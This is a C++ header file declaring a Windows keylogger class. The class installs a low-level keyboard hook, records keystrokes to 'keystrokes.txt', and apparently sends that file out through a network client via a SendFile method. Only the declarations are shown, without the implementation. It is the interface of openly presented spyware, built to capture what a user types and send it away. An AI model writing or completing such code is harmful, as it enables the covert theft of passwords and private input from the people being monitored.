#ifndef KEYLOGGER_HPP
#define KEYLOGGER_HPP

#include <string>
#include <Windows.h>
#include <iostream>
#include "../lib/ClientNetwork.hpp"
#include "../lib/FileHandler.hpp"

class Keylogger {
    public:
        static Keylogger* getInstance(const std::string& filename = "keystrokes.txt");

        Keylogger(const std::string& filename);
        ~Keylogger();

        void InstallHook();
        void UninstallHook();
        void Run();
        void SendFile(); 

    private:
        static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
        static Keylogger* instance;

        HHOOK hook;
        FileHandler fileHandler;
        ClientNetwork client;
};


#endif // KEYLOGGER_HPP